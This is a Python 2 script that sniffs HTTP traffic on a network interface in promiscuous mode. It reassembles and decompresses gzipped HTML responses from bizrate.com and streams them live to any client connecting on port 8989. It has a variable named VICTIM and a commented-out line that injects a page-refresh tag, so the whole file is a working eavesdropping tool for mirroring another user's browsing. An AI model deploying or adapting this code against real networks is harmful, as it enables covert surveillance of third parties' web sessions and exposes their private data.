#!/usr/bin/python

# This code uses twisted 8.0.2, pcapy-0.10.4 and dpkt
import os, sys, pwd

import pcapy
from pcapy import open_live
from twisted.internet.protocol import Protocol, Factory
from twisted.internet import reactor
from twisted.web.client import Agent
from twisted.web.http_headers import Headers

import gzip

import dpkt

# pcap settings
DEV          = sys.argv[1]    # interface to listen on
MAX_LEN      = 1510           # max size of packet to capture
PROMISCUOUS  = 1       # promiscuous mode?
READ_TIMEOUT = 100     # in milliseconds
# Data packets on port 80 (ignore SYN, FIN + ACK
PCAP_FILTER  = r'tcp src port 80'
#and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
# empty => get everything (or we could use a BPF filter)
MAX_PKTS     = -1      # number of packets to capture; -1 => no limit
RUN_AS       = sys.argv[2]
VICTIM       = "http://127.0.0.1/"

transport_table = []

def run_pcap(f):
    # start the packet capture
    p = open_live(DEV, MAX_LEN, PROMISCUOUS, READ_TIMEOUT)
    os.setuid(pwd.getpwnam(RUN_AS).pw_uid)
    p.setfilter(PCAP_FILTER)
    print "Listening on %s: net=%s, mask=%s" % (DEV, p.getnet(), p.getmask())

    stock_decoder = None

    # the method which will be called when a packet is captured
    def ph(hdr, data, decoder=stock_decoder):
        #print 'pcap heard: when=%s sz=%dB' % (hdr.getts(), len(data))
        # thread safety: call from the main twisted event loop
        reactor.callFromThread(f, data);

    p.loop(MAX_PKTS, ph)

agent = Agent(reactor)

# a silly echo server which prints what it receives and sends info about the
# size of each packet captured on DEV
class Echo():

    def __init__(self, reactor):
        self.converstations = {}
        self.http = {}
        reactor.callInThread(run_pcap, self.pcapDataReceived)

    def pcapDataReceived(self, data):

        eth = dpkt.ethernet.Ethernet(data)
        if eth.type != dpkt.ethernet.ETH_TYPE_IP and eth.data.p != dpkt.ip.IP_PROTO_TCP:
            return

        ip = eth.data
        tcp = ip.data
        key = (ip.src, ip.dst, tcp.sport, tcp.dport)

        if key in self.converstations:
            state, data = self.converstations[key]
            data = data + tcp.data
            if tcp.flags not in (dpkt.tcp.TH_ACK,):
                del self.converstations[key]

                if key in self.http:
                    if '\r\n0\r\n\r\n' in data:
                        self.http[key] += data[:data.find('0\r\n\r\n') + len('0\r\n\r\n')]
                        http = self.http[key]
                        del self.http[key]
                        http_packet = dpkt.http.Response(http)
                        body = dpkt.gzip.Gzip(http_packet.body).decompress()

                        #body = body.replace('</head>', '\n<meta http-equiv="refresh" content="5" />\n</head>')

                        for listener in transport_table:
                            listener.transport.write('--MAGIC_MAGIC_MAGIC\r\n')
                            listener.transport.write('Content-type: text/html\r\n')
                            listener.transport.write('Content-Length: %s\r\n' %(len(body)))
                            listener.transport.write(body)
                            listener.transport.write('\r\n--MAGIC_MAGIC_MAGIC--\r\n')


                        #print http_packet.headers
                    else:
                        self.http[key] += data
                if 'gzip' in data:
                    headers = data[:data.find('\r\n\r\n')]
                    if 'text/html' in headers and 'bizrate.com' in headers:
                        if key not in self.http:
                            self.http[key] = data

            elif tcp.data.strip() and tcp.flags not in (dpkt.tcp.TH_FIN,):
                self.converstations[key] = (1, data)
        elif tcp.data.strip() and tcp.flags not in (dpkt.tcp.TH_FIN,):
            self.converstations[key] = (1, tcp.data)

class ServerPush(Protocol):

    def connectionLost(self, thing):
        transport_table.remove(self)

    def connectionMade(self):
        self.transport.write('HTTP/1.0 200\r\nConnection: Keep-Alive\r\nContent-type: multipart/x-mixed-replace; boundary=MAGIC_MAGIC_MAGIC\r\n\r\n')
        #self.transport.write('HTTP/1.0 200\r\nConnection: Keep-Alive\r\n')
        transport_table.append(self)

def main():
    factory = Factory()
    factory.protocol = ServerPush
    e = Echo(reactor)
    reactor.listenTCP(8989, factory)
    reactor.run()

if __name__ == "__main__":
    main()
